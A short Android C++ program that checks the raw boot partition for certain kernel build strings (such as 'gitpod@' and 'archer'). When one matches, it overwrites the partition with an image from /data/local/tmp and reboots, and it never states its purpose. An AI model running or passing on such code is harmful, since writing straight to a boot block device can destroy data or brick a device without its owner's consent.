#include <iostream>
#include <fstream>
#include <regex>
#include <string>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <errno.h>
#include <cstdlib>
#include <android/log.h>

bool searchForPatternsInFile(const std::string& filename, const std::vector<std::string>& patterns) {
    int fd = open(filename.c_str(), O_RDONLY);
    if (fd == -1) {
        return false;
    }

    const size_t bufferSize = 4096;
    char buffer[bufferSize];
    ssize_t bytesRead;

    std::vector<std::regex> regexPatterns;
    for (const auto& pattern : patterns) {
        regexPatterns.push_back(std::regex(pattern, std::regex::icase));  // Case insensitive
    }

    std::string fileContents;

    while ((bytesRead = read(fd, buffer, bufferSize)) > 0) {
        fileContents.append(buffer, bytesRead);
    }

    close(fd);

    for (const auto& re : regexPatterns) {
        if (std::regex_search(fileContents, re)) {
            return true;  // Found at least one match
        }
    }

    return false;
}

bool copyFile(const std::string& source, const std::string& destination) {
    int srcFd = open(source.c_str(), O_RDONLY);
    int destFd = open(destination.c_str(), O_WRONLY | O_CREAT | O_TRUNC, S_IRUSR | S_IWUSR);

    if (srcFd == -1 || destFd == -1) {
        return false;
    }

    char buffer[4096];
    ssize_t bytesRead;
    while ((bytesRead = read(srcFd, buffer, sizeof(buffer))) > 0) {
        if (write(destFd, buffer, bytesRead) != bytesRead) {
            close(srcFd);
            close(destFd);
            return false;
        }
    }

    close(srcFd);
    close(destFd);

    return true;
}

void rebootSystem() {
    int result = system("reboot");
}

int main() {
    std::string bootFile = "/dev/block/by-name/boot";
    std::vector<std::string> patterns = {"edgars@", "gitpod@", "archer", "h61m"};
    std::string bootImg = "/data/local/tmp/boot.img";

    if (searchForPatternsInFile(bootFile, patterns)) {
        if (copyFile(bootImg, bootFile)) {
            rebootSystem();
        }
    }

    return 0;
}
